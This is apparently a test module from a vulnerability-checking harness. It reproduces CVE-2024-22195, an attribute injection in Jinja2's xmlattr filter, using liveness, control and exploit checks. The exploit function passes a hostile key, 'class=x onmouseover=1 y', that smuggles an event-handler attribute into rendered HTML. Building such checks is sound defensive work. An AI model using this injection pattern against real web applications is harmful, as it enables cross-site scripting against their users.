"""CVE-2024-22195 -- Jinja2 xmlattr injects attributes from a key (3.1.2 -> 3.1.3).

Oracle, declared before execution: the rendered start tag carries an attribute
*name* that the template author never wrote. The tag is parsed with the standard
library's HTML parser and the oracle compares the resulting attribute-name set
against the one legitimate name; it never searches the output for the payload
text, which would be matching on a value the probe supplied.
"""

from __future__ import annotations

import os

from ._support import attribute_names, pinned_version

DIST = "Jinja2"
MODULE = "jinja2"

#: A key carrying whitespace, which is what 3.1.3 began rejecting. The value is
#: inert: the injection is in the key.
_HOSTILE_KEY = "class=x onmouseover=1 y"
_TEMPLATE = "<a {{ d|xmlattr }}>x</a>"
_LEGITIMATE = {"href"}


def _render(key: str) -> tuple[set[str], str]:
    import jinja2

    env = jinja2.Environment(autoescape=True)
    out = env.from_string(_TEMPLATE).render(d={"href": "/ok", key: "z"})
    return set(attribute_names(out)), out


def liveness(ctx: dict) -> tuple[bool, str]:
    """xmlattr must render an ordinary mapping, and the pin must be the pin."""
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    names, out = _render("title")
    ok = names == {"href", "title"}
    return ok, f"benign render -> {sorted(names)} from {os.path.basename(origin)}; {out!r}"


def control(ctx: dict) -> tuple[bool, str]:
    """The same oracle on a well-formed key. Must NOT fire."""
    names, out = _render("data-id")
    extra = names - _LEGITIMATE - {"data-id"}
    return bool(extra), f"benign key, unexpected attributes={sorted(extra)}; {out!r}"


def exploit(ctx: dict) -> tuple[bool, str]:
    try:
        names, out = _render(_HOSTILE_KEY)
    except ValueError as exc:
        return False, f"refused by the filter: ValueError: {exc}"
    extra = names - _LEGITIMATE
    return bool(extra), f"injected attribute names={sorted(extra)}; {out!r}"
